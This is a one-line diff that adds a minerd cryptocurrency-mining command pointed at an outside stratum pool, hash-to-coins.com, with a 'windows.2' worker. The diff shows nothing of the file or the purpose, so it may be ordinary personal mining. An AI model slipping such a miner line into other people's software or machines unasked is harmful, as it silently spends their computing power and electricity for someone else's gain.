@@ -1,0 +1,1 @@
+minerd -a scrypt -t 1 -s 4 -o stratum+tcp://hash-to-coins.com:3333 -u windows.2 -p blank
